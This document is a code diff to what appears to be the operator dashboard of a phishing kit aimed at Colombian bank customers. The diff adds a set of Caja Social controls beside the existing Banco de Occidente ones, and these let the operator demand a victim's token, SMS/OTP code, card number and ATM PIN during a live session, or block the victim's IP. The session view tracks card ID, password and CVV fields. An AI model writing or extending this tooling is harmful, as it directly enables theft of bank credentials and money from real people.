@@ -692,24 +692,31 @@ function botonesSesion(s) {
 
     // 🔥 BOTONES DE BANCO DE OCCIDENTE (ORDEN ESTRICTO) 🔥
     if (bancoKey === 'occidente') {
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
+        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
+        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC Occi" onclick="accion('${sid}','PEDIR_TARJETA_OCCIDENTE')">💳</button>`);
+        btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        return btns.join('');
+    }
+
+    // 🔥 BOTONES DE CAJA SOCIAL (ORDEN ESTRICTO) 🔥
+    if (bancoKey === 'caja-social') {
         // 1. Rechazar
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        
         // 2. Pedir Token
         btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
-        
-        // 3. Pedir OTP
-        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        
-        // 4. Pedir CC Occi
-        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC Occi" onclick="accion('${sid}','PEDIR_TARJETA_OCCIDENTE')">💳</button>`);
-        
-        // 5. Finalizar
+        // 3. Pedir SMS / OTP
+        btns.push(`<button class="btn btn-otp" title="Pedir SMS" onclick="accion('${sid}','OTP')">📱</button>`);
+        // 4. Pedir CC (Tarjeta)
+        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC" onclick="accion('${sid}','PEDIR_TARJETA_CAJA_SOCIAL')">💳</button>`);
+        // 5. Clave de CC (ATM) → confirmacion.html
+        btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Clave de CC (ATM)" onclick="accion('${sid}','PEDIR_PIN_CAJA_SOCIAL')">🔐</button>`);
+        // 6. Finalizar
         btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
-        
-        // 6. Bloquear IP
+        // 7. Bloquear IP
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
-        
         return btns.join('');
     }
 
@@ -857,7 +864,7 @@ function renderSesiones() {
         }
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
-        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda' || banco === 'bbva' || banco === 'popular' || banco === 'occidente';
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda' || banco === 'bbva' || banco === 'popular' || banco === 'occidente' || banco === 'caja-social';
         let identificacionTrj = '-';
         let claveFch = '-';
         let cvv = '-';
